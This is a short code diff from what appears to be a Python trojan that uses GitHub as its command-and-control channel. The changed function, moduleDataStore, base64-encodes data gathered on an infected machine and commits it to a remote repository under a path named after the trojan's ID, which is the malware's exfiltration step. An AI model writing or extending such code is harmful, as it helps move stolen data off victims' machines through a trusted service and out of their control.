@@ -46,7 +46,7 @@ def getConfigJson():
 
 def moduleDataStore(data):
 	gh, repo, branch = connectToGit()
-	remote_path = "data/%s/%d.data" % (data_path, random.randint(1000,10000))
+	remote_path = "data/%s/%d.data" % (trojan_id, random.randint(1000,10000))
 	repo.create_file(remote_path, "Commit message from %s"%trojan_id, base64.b64encode(data))
 	return
 
